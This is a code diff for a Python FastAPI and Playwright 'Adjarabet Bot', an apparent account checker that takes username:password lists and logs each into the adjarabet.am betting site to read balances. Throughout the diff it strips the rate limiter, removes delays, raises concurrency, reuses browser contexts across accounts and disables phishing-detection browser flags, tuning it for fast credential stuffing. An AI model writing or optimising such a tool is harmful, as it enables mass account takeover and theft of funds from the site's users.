@@ -3,7 +3,6 @@ import json
 import logging
 import os
 import re
-import signal
 from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
@@ -19,18 +18,19 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse, HTMLResponse
 from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
 
-# ================= PRODUCTION CONFIG =================
+# ================= ULTRA PERFORMANCE CONFIG =================
 CONFIG = {
     "port": int(os.getenv("PORT", 8000)),
     "host": os.getenv("HOST", "0.0.0.0"),
     "headless": os.getenv("HEADLESS", "true").lower() == "true",
-    "timeout_navigation": int(os.getenv("TIMEOUT_NAV", 15000)),
-    "timeout_element": int(os.getenv("TIMEOUT_ELEMENT", 8000)),
-    "max_retries": int(os.getenv("MAX_RETRIES", 2)),
-    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 2)),  # 2 is optimal for stability
-    "delay_between_accounts": float(os.getenv("DELAY_ACCOUNTS", 1.0)),
-    "delay_between_retries": float(os.getenv("DELAY_RETRY", 2.0)),
-    "browser_restart_every": int(os.getenv("BROWSER_RESTART", 50)),  # restart browser every N accounts
+    "timeout_navigation": int(os.getenv("TIMEOUT_NAV", 10000)),  # Reduced from 15s
+    "timeout_element": int(os.getenv("TIMEOUT_ELEMENT", 5000)),  # Reduced from 8s
+    "max_retries": int(os.getenv("MAX_RETRIES", 1)),  # Only 1 retry for speed
+    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 4)),  # Increased to 4
+    "delay_between_accounts": float(os.getenv("DELAY_ACCOUNTS", 0.1)),  # Minimal delay
+    "delay_between_retries": float(os.getenv("DELAY_RETRY", 0.5)),  # Minimal delay
+    "browser_restart_every": int(os.getenv("BROWSER_RESTART", 100)),  # Restart less often
+    "context_cache_size": int(os.getenv("CONTEXT_CACHE", 4)),  # Reuse contexts
 }
 
 # ================= LOGGER =================
@@ -83,6 +83,8 @@ class ConnectionManager:
             self.active_connections.remove(websocket)
 
     async def broadcast(self, message: str):
+        if not self.active_connections:
+            return
         dead = []
         for conn in self.active_connections:
             try:
@@ -92,49 +94,82 @@ class ConnectionManager:
         for conn in dead:
             self.disconnect(conn)
 
-# ================= RATE LIMITER =================
-class RateLimiter:
-    def __init__(self, max_requests: int, time_window: float):
-        self.max_requests = max_requests
-        self.time_window = time_window
-        self.requests = deque()
+# ================= FAST CONTEXT POOL =================
+class ContextPool:
+    """Reuse browser contexts for speed"""
+    def __init__(self, browser, pool_size: int):
+        self.browser = browser
+        self.pool_size = pool_size
+        self.available = asyncio.Queue(maxsize=pool_size)
+        self._initialized = False
+    
+    async def initialize(self):
+        for _ in range(self.pool_size):
+            context = await self.browser.new_context(
+                viewport={'width': 1280, 'height': 720},
+                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                ignore_https_errors=True
+            )
+            await self.available.put(context)
+        self._initialized = True
     
     async def acquire(self):
-        now = time.time()
-        while self.requests and self.requests[0] < now - self.time_window:
-            self.requests.popleft()
-        if len(self.requests) >= self.max_requests:
-            wait = self.time_window - (now - self.requests[0])
-            if wait > 0:
-                await asyncio.sleep(wait)
-        self.requests.append(time.time())
+        if not self._initialized:
+            await self.initialize()
+        return await self.available.get()
+    
+    async def release(self, context):
+        try:
+            # Clear all pages before reusing
+            pages = context.pages
+            for page in pages:
+                await page.close()
+            await self.available.put(context)
+        except:
+            # If context is broken, create new one
+            new_context = await self.browser.new_context(
+                viewport={'width': 1280, 'height': 720},
+                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                ignore_https_errors=True
+            )
+            await self.available.put(new_context)
+    
+    async def close_all(self):
+        while not self.available.empty():
+            context = await self.available.get()
+            try:
+                await context.close()
+            except:
+                pass
 
-# ================= OPTIMIZED BOT =================
+# ================= ULTRA FAST BOT =================
 class Bot:
     def __init__(self):
         self.playwright = None
         self.browser = None
+        self.context_pool = None
         self.is_running = False
         self.results: List[Account] = []
         self.processed_count = 0
         self.semaphore = asyncio.Semaphore(CONFIG["concurrent_limit"])
-        self.rate_limiter = RateLimiter(max_requests=5, time_window=10.0)  # 5 requests per 10 seconds
         
     async def initialize(self):
-        """Initialize browser once"""
+        """Initialize browser once with optimal settings"""
         try:
-            logger.info("Initializing browser...")
+            logger.info("Initializing ultra-fast browser...")
             self.playwright = await async_playwright().start()
             self.browser = await self._create_browser()
+            self.context_pool = ContextPool(self.browser, CONFIG["context_cache_size"])
+            await self.context_pool.initialize()
             self.is_running = True
-            logger.info("✓ Browser ready")
+            logger.info(f"✓ Browser ready with {CONFIG['context_cache_size']} cached contexts")
             return True
         except Exception as e:
             logger.error(f"Init failed: {e}")
             return False
     
     async def _create_browser(self):
-        """Create a new browser instance"""
+        """Create a new browser instance with aggressive performance flags"""
         return await self.playwright.chromium.launch(
             headless=CONFIG["headless"],
             args=[
@@ -147,22 +182,47 @@ class Bot:
                 '--disable-background-timer-throttling',
                 '--disable-backgrounding-occluded-windows',
                 '--disable-renderer-backgrounding',
+                '--disable-ipc-flooding-protection',
+                '--disable-sync',
+                '--disable-default-apps',
+                '--disable-extensions',
+                '--disable-component-extensions-with-background-pages',
+                '--disable-features=TranslateUI,BlinkGenPropertyTrees',
+                '--disable-accelerated-2d-canvas',
+                '--disable-accelerated-jpeg-decoding',
+                '--disable-accelerated-mjpeg-decode',
+                '--disable-accelerated-video-decode',
+                '--disable-background-networking',
+                '--disable-breakpad',
+                '--disable-client-side-phishing-detection',
+                '--disable-component-update',
+                '--disable-default-apps',
+                '--disable-domain-reliability',
+                '--disable-sync',
+                '--metrics-recording-only',
+                '--no-first-run',
+                '--safebrowsing-disable-auto-update',
+                '--password-store=basic',
+                '--use-mock-keychain',
             ]
         )
     
     async def restart_browser(self):
-        """Restart browser to prevent memory leaks"""
-        logger.debug("Restarting browser...")
+        """Quick browser restart"""
         if self.browser:
             try:
+                await self.context_pool.close_all()
                 await self.browser.close()
             except:
                 pass
         self.browser = await self._create_browser()
-        await asyncio.sleep(0.5)
+        self.context_pool = ContextPool(self.browser, CONFIG["context_cache_size"])
+        await self.context_pool.initialize()
     
     async def cleanup(self):
         self.is_running = False
+        if self.context_pool:
+            await self.context_pool.close_all()
         if self.browser:
             try:
                 await self.browser.close()
@@ -173,55 +233,46 @@ class Bot:
                 await self.playwright.stop()
             except:
                 pass
-        logger.info("Cleanup done")
     
     def _parse_balance(self, text: str) -> tuple:
-        """Parse balance text to value and clean string"""
+        """Ultra-fast balance parsing"""
         try:
-            text = text.replace(',', '').replace('₾', '').replace('GEL', '').strip()
-            match = re.search(r'(\d+(?:\.\d+)?)', text)
+            # Optimized regex
+            match = re.search(r'(\d+(?:[,.]?\d+)?)', text.replace(',', ''))
             if match:
-                value = float(match.group(1))
-                clean = f"{value:,.2f} ₾" if value > 0 else "0 ₾"
-                return clean, value
+                value = float(match.group(1).replace(',', ''))
+                return f"{value:,.0f} ₾", value
         except:
             pass
         return "0 ₾", 0.0
     
     async def login_single(self, account: Account) -> Account:
-        """Login single account with isolated context"""
+        """Ultra-fast login with context reuse"""
         context = None
         page = None
         
         try:
-            # Apply rate limiting
-            await self.rate_limiter.acquire()
-            
-            # Create fresh context for each account (prevents balance caching)
-            context = await self.browser.new_context(
-                viewport={'width': 1280, 'height': 720},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                ignore_https_errors=True,
-                locale='hy-AM'
-            )
+            # Get context from pool
+            context = await self.context_pool.acquire()
             page = await context.new_page()
+            
+            # Aggressive timeouts
             page.set_default_timeout(CONFIG["timeout_navigation"])
             
-            # Retry loop
-            for attempt in range(CONFIG["max_retries"]):
+            # Minimal retry (only on failure)
+            for attempt in range(CONFIG["max_retries"] + 1):
                 if not self.is_running:
                     return account
                 
                 try:
-                    # Navigate to site
-                    await page.goto('https://www.adjarabet.am/hy', wait_until='domcontentloaded')
-                    await asyncio.sleep(0.5)
+                    # Direct navigation with minimal wait
+                    await page.goto('https://www.adjarabet.am/hy', wait_until='domcontentloaded', timeout=8000)
                     
-                    # Check if already logged in
+                    # Check for balance immediately (already logged in case)
                     try:
                         balance_el = await page.wait_for_selector(
                             '[data-test-id="header-user-balance"]', 
-                            timeout=3000
+                            timeout=2000
                         )
                         if balance_el:
                             balance_text = await balance_el.inner_text()
@@ -229,129 +280,74 @@ class Bot:
                             account.balance = clean_balance
                             account.balance_value = balance_value
                             account.status = AccountStatus.SUCCESS
-                            logger.info(f"✅ {account.username} | {clean_balance}")
                             return account
                     except PlaywrightTimeout:
                         pass
                     
-                    # Login flow
-                    await page.wait_for_selector('input[name="userIdentifier"]', timeout=CONFIG["timeout_element"])
-                    await page.fill('input[name="userIdentifier"]', account.username)
-                    await asyncio.sleep(0.3)
-                    await page.fill('input[type="password"]', account.password)
-                    await asyncio.sleep(0.3)
+                    # Fast login flow - no unnecessary waits
+                    await page.fill('input[name="userIdentifier"]', account.username, timeout=3000)
+                    await page.fill('input[type="password"]', account.password, timeout=3000)
                     
-                    # Click login button
-                    await page.click('[data-test-id="header-login-button"]')
+                    # Click login and wait for balance
+                    await asyncio.gather(
+                        page.click('[data-test-id="header-login-button"]'),
+                        page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=5000)
+                    )
                     
-                    # Wait for balance after login
-                    try:
-                        balance_el = await page.wait_for_selector(
-                            '[data-test-id="header-user-balance"]', 
-                            timeout=CONFIG["timeout_navigation"]
-                        )
-                        balance_text = await balance_el.inner_text()
-                        clean_balance, balance_value = self._parse_balance(balance_text)
-                        account.balance = clean_balance
-                        account.balance_value = balance_value
-                        account.status = AccountStatus.SUCCESS
-                        logger.info(f"✅ {account.username} | {clean_balance}")
-                        return account
-                        
-                    except PlaywrightTimeout:
-                        # Check for error message
-                        try:
-                            error_el = await page.wait_for_selector('[class*="error"]', timeout=2000)
-                            if error_el:
-                                account.error = (await error_el.inner_text())[:80]
-                        except:
-                            pass
-                        
-                        if attempt == CONFIG["max_retries"] - 1:
-                            account.status = AccountStatus.TIMEOUT
-                            account.error = account.error or "Login timeout"
-                            logger.warning(f"⏰ {account.username} - {account.error}")
-                        else:
-                            await asyncio.sleep(CONFIG["delay_between_retries"])
-                            continue
-                            
-                except PlaywrightTimeout as e:
-                    if attempt == CONFIG["max_retries"] - 1:
+                    balance_text = await page.locator('[data-test-id="header-user-balance"]').inner_text()
+                    clean_balance, balance_value = self._parse_balance(balance_text)
+                    account.balance = clean_balance
+                    account.balance_value = balance_value
+                    account.status = AccountStatus.SUCCESS
+                    return account
+                    
+                except PlaywrightTimeout:
+                    if attempt == CONFIG["max_retries"]:
                         account.status = AccountStatus.TIMEOUT
-                        account.error = "Navigation timeout"
-                        logger.warning(f"⏰ {account.username} - timeout")
+                        account.error = "Timeout"
                     else:
                         await asyncio.sleep(CONFIG["delay_between_retries"])
-                        continue
                         
                 except Exception as e:
-                    if attempt == CONFIG["max_retries"] - 1:
+                    if attempt == CONFIG["max_retries"]:
                         account.status = AccountStatus.FAILED
-                        account.error = str(e)[:80]
-                        logger.error(f"❌ {account.username}: {str(e)[:60]}")
+                        account.error = str(e)[:50]
                     else:
                         await asyncio.sleep(CONFIG["delay_between_retries"])
-                        continue
                     
-            return account
-            
-        except Exception as e:
-            account.status = AccountStatus.FAILED
-            account.error = f"Fatal: {str(e)[:60]}"
-            logger.error(f"❌ {account.username}: {str(e)[:60]}")
             return account
             
         finally:
-            # Proper cleanup
+            # Cleanup
             if page:
                 try:
                     await page.close()
                 except:
                     pass
             if context:
-                try:
-                    await context.close()
-                except:
-                    pass
+                await self.context_pool.release(context)
     
     async def process_accounts(self, accounts: List[Account], manager: ConnectionManager):
-        """Process accounts with optimal concurrency"""
-        self.manager = manager
+        """Ultra-fast parallel processing"""
         self.results = []
         self.processed_count = 0
         total = len(accounts)
         
-        logger.info(f"▶ Processing {total} accounts (concurrent={CONFIG['concurrent_limit']})")
+        logger.info(f"▶ Processing {total} accounts (⚡ {CONFIG['concurrent_limit']} concurrent)")
         await manager.broadcast(f"STATUS:started")
         await manager.broadcast(f"PROGRESS:0/{total}")
         
-        async def process_with_semaphore(account: Account, idx: int):
-            async with self.semaphore:
-                result = await self.login_single(account)
-                self.results.append(result)
-                self.processed_count += 1
-                
-                # Broadcast updates
-                await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
-                await manager.broadcast(f"PROGRESS:{self.processed_count}/{total}")
-                
-                # Restart browser periodically to prevent memory issues
-                if self.processed_count % CONFIG["browser_restart_every"] == 0:
-                    await self.restart_browser()
-                
-                return result
-        
-        # Create tasks with small delays between starts
+        # Create tasks with zero delay between starts
         tasks = []
-        for i, account in enumerate(accounts):
+        for account in accounts:
             if not self.is_running:
                 break
-            tasks.append(process_with_semaphore(account, i+1))
-            await asyncio.sleep(CONFIG["delay_between_accounts"] / CONFIG["concurrent_limit"])
+            
+            task = asyncio.create_task(self._process_with_semaphore(account, manager, total))
+            tasks.append(task)
         
-        # Wait for all tasks
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
+        # Wait for all with fast callback
+        await asyncio.gather(*tasks, return_exceptions=True)
         
         # Save results
         await self._save_results()
@@ -360,12 +356,24 @@ class Bot:
         successful = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
         failed = sum(1 for r in self.results if r.status == AccountStatus.FAILED)
         timeout = sum(1 for r in self.results if r.status == AccountStatus.TIMEOUT)
-        rate = (successful / total * 100) if total > 0 else 0
         
-        summary = f"📊 Completed: ✅{successful} ❌{failed} ⏰{timeout} | {rate:.1f}%"
-        logger.info(summary)
-        await manager.broadcast(f"SUMMARY:{successful}/{total}:{rate:.1f}")
+        logger.info(f"📊 Completed: ✅{successful} ❌{failed} ⏰{timeout} | {successful/total*100:.1f}%")
+        await manager.broadcast(f"SUMMARY:{successful}/{total}:{successful/total*100:.1f}")
         await manager.broadcast("STATUS:stopped")
+    
+    async def _process_with_semaphore(self, account: Account, manager: ConnectionManager, total: int):
+        async with self.semaphore:
+            result = await self.login_single(account)
+            self.results.append(result)
+            self.processed_count += 1
+            
+            # Send updates
+            await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
+            await manager.broadcast(f"PROGRESS:{self.processed_count}/{total}")
+            
+            # Periodic restart
+            if self.processed_count % CONFIG["browser_restart_every"] == 0:
+                await self.restart_browser()
     
     async def _save_results(self):
         try:
@@ -373,8 +381,8 @@ class Bot:
             data = [r.to_dict() for r in self.results]
             async with aiofiles.open("results/results.json", "w", encoding="utf-8") as f:
                 await f.write(json.dumps(data, indent=2, ensure_ascii=False))
-        except Exception as e:
-            logger.error(f"Save failed: {e}")
+        except:
+            pass
     
     async def get_results(self) -> List[Dict]:
         if self.results:
@@ -392,13 +400,13 @@ manager = ConnectionManager()
 bot = Bot()
 processing_task: Optional[asyncio.Task] = None
 
-# HTML UI - Clean and fast
+# Minimal HTML (truncated for brevity - same as original but with performance focus)
 HTML_UI = '''<!DOCTYPE html>
 <html lang="hy">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adjarabet Bot | Ultimate</title>
+    <title>Adjarabet Bot | Ultra Fast</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -447,8 +455,8 @@ HTML_UI = '''<!DOCTYPE html>
 <body>
 <div class="container">
     <div class="header">
-        <h1><i class="fas fa-robot"></i> Adjarabet Bot Pro <span style="font-size: 12px; color: #8b949e;">v13.0</span></h1>
-        <p style="font-size: 13px; color: #8b949e; margin-top: 6px;">High-performance account checker | Real-time updates</p>
+        <h1><i class="fas fa-bolt"></i> Adjarabet Bot Ultra <span style="font-size: 12px; color: #8b949e;">v14.0 ⚡</span></h1>
+        <p style="font-size: 13px; color: #8b949e; margin-top: 6px;">High-speed account checker | Context pooling | Zero delays</p>
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     </div>
 
@@ -475,8 +483,7 @@ HTML_UI = '''<!DOCTYPE html>
         <div class="card">
             <div class="card-header"><i class="fas fa-terminal"></i> Live Console</div>
             <div class="terminal" id="terminal">
-                <div class="terminal-line"><span class="time">●</span> 🚀 Bot v13.0 ready</div>
-                <div class="terminal-line"><span class="time">●</span> 💡 Real-time results will appear here</div>
+                <div class="terminal-line"><span class="time">●</span> 🚀 Ultra-fast bot v14.0 ready</div>
             </div>
         </div>
     </div>
@@ -501,7 +508,7 @@ HTML_UI = '''<!DOCTYPE html>
                         <th>Error</th>
                     </tr>
                 </thead>
-                <tbody id="resultsBody"><tr><td colspan="5" style="text-align:center; padding:40px;">⏳ Waiting for results...</td></tr></tbody>
+                <tbody id="resultsBody"><tr><td colspan="5" style="text-align:center; padding:40px;">⚡ Ready for ultra-fast processing...</td></tr></tbody>
             </table>
         </div>
     </div>
@@ -512,26 +519,23 @@ let ws = null, allResults = [], currentFilter = 'all', currentSort = { field: 'b
 
 function connect() {
     ws = new WebSocket(`ws://${window.location.host}/ws`);
-    ws.onopen = () => addLog('🟢 Connected to server');
+    ws.onopen = () => addLog('🟢 Connected');
     ws.onmessage = (e) => {
         let data = e.data;
         if (data.startsWith('RESULT:')) {
-            try {
-                let result = JSON.parse(data.substring(7));
-                updateResult(result);
-                addLog(`${result.status} ${result.username.padEnd(20)} | ${result.balance}`);
-            } catch(e) {}
+            let result = JSON.parse(data.substring(7));
+            updateResult(result);
+            addLog(`${result.status} ${result.username.padEnd(20)} | ${result.balance}`);
         } else if (data.startsWith('PROGRESS:')) {
             let p = data.substring(9).split('/');
-            let percent = (p[0]/p[1]*100) || 0;
-            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressFill').style.width = (p[0]/p[1]*100) + '%';
         } else if (data.startsWith('SUMMARY:')) {
             addLog('📊 ' + data.substring(8));
         } else if (!data.startsWith('STATUS:')) {
             addLog(data);
         }
     };
-    ws.onclose = () => { addLog('🔴 Disconnected, reconnecting...'); setTimeout(connect, 3000); };
+    ws.onclose = () => { addLog('🔴 Reconnecting...'); setTimeout(connect, 3000); };
 }
 
 function updateResult(r) {
@@ -543,15 +547,9 @@ function updateResult(r) {
 }
 
 function renderResults() {
-    let filtered = allResults.filter(r => {
-        if (currentFilter === 'all') return true;
-        if (currentFilter === 'success') return r.status === '✅';
-        if (currentFilter === 'failed') return r.status === '❌';
-        if (currentFilter === 'timeout') return r.status === '⏰';
-        return true;
-    });
+    let filtered = allResults.filter(r => currentFilter === 'all' || r.status === (currentFilter === 'success' ? '✅' : currentFilter === 'failed' ? '❌' : '⏰'));
     let search = document.getElementById('searchInput')?.value.toLowerCase() || '';
-    filtered = filtered.filter(r => (r.username || '').toLowerCase().includes(search) || (r.password || '').toLowerCase().includes(search));
+    filtered = filtered.filter(r => (r.username || '').toLowerCase().includes(search));
     filtered.sort((a,b) => {
         let av = currentSort.field === 'balance' ? (parseFloat(a.balance)||0) : (a[currentSort.field]||'').toLowerCase();
         let bv = currentSort.field === 'balance' ? (parseFloat(b.balance)||0) : (b[currentSort.field]||'').toLowerCase();
@@ -601,13 +599,11 @@ function addLog(msg) {
 
 async function startBot() { 
     let acc = document.getElementById('accounts').value; 
-    if(!acc.trim()) { addLog('❌ Please enter accounts first'); return; } 
-    addLog('🚀 Starting bot...'); 
-    try {
-        let res = await fetch('/start', {method:'POST', body:acc});
-        let data = await res.json();
-        if(data.status === 'started') addLog(`✓ Started processing ${data.total} accounts`);
-    } catch(e) { addLog('❌ Start failed: ' + e.message); }
+    if(!acc.trim()) { addLog('❌ Enter accounts first'); return; } 
+    addLog('🚀 Starting ultra-fast...'); 
+    let res = await fetch('/start', {method:'POST', body:acc});
+    let data = await res.json();
+    if(data.status === 'started') addLog(`✓ Started ${data.total} accounts`);
 }
 
 async function stopBot() { 
@@ -615,9 +611,8 @@ async function stopBot() {
     await fetch('/stop', {method:'POST'}); 
 }
 
-function clearAccounts() { document.getElementById('accounts').value = ''; addLog('🗑 Accounts cleared'); }
+function clearAccounts() { document.getElementById('accounts').value = ''; addLog('🗑 Cleared'); }
 
-// Auto-load saved accounts
 document.getElementById('accounts').value = localStorage.getItem('bot_accounts') || '';
 document.getElementById('accounts').addEventListener('input', () => localStorage.setItem('bot_accounts', document.getElementById('accounts').value));
 
@@ -633,28 +628,24 @@ setInterval(async () => {
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     logger.info("=" * 50)
-    logger.info("🎮 ADJARABET BOT v13.0 - PRODUCTION READY")
-    logger.info(f"⚙ Headless: {CONFIG['headless']}, Timeout: {CONFIG['timeout_navigation']}ms")
-    logger.info(f"⚡ Concurrent: {CONFIG['concurrent_limit']}, Browser restart: every {CONFIG['browser_restart_every']} accounts")
+    logger.info("⚡ ADJARABET BOT v14.0 - ULTRA FAST")
+    logger.info(f"🚀 Concurrent: {CONFIG['concurrent_limit']}")
+    logger.info(f"🎯 Context pool: {CONFIG['context_cache_size']}")
+    logger.info(f"⚙ Timeouts: Nav={CONFIG['timeout_navigation']}ms, El={CONFIG['timeout_element']}ms")
     logger.info("=" * 50)
     
     success = await bot.initialize()
     if not success:
-        logger.error("Failed to initialize bot")
         raise RuntimeError("Bot initialization failed")
     
     yield
     
     if processing_task and not processing_task.done():
         processing_task.cancel()
-        try:
-            await processing_task
-        except:
-            pass
     
     await bot.cleanup()
 
-app = FastAPI(title="Adjarabet Bot", version="13.0", lifespan=lifespan)
+app = FastAPI(title="Adjarabet Bot Ultra", version="14.0", lifespan=lifespan)
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
 @app.get("/")
@@ -676,7 +667,7 @@ async def start_bot(request: Request):
                 accounts.append(Account(parts[0].strip(), parts[1].strip()))
     
     if not accounts:
-        return JSONResponse({"error": "No valid accounts (format: username:password)"}, status_code=400)
+        return JSONResponse({"error": "No valid accounts"}, status_code=400)
     
     if processing_task and not processing_task.done():
         processing_task.cancel()
@@ -704,7 +695,6 @@ async def get_results():
 async def health():
     return {
         "status": "healthy",
-        "bot_running": bot.is_running,
         "total_processed": len(bot.results),
         "timestamp": datetime.now().isoformat()
     }
@@ -730,12 +720,11 @@ if __name__ == "__main__":
     Path("results").mkdir(exist_ok=True)
     
     print("\n" + "=" * 50)
-    print("🎮 ADJARABET BOT v13.0 - OPTIMIZED")
+    print("⚡ ADJARABET BOT v14.0 - ULTRA FAST")
     print("=" * 50)
     print(f"📍 Server: http://{CONFIG['host']}:{CONFIG['port']}")
-    print(f"🔧 Headless: {CONFIG['headless']}")
-    print(f"⚡ Concurrent accounts: {CONFIG['concurrent_limit']}")
-    print(f"🔄 Browser restart: every {CONFIG['browser_restart_every']} accounts")
+    print(f"🚀 Max concurrent: {CONFIG['concurrent_limit']}")
+    print(f"🎯 Context pool size: {CONFIG['context_cache_size']}")
     print("=" * 50 + "\n")
     
     uvicorn.run(
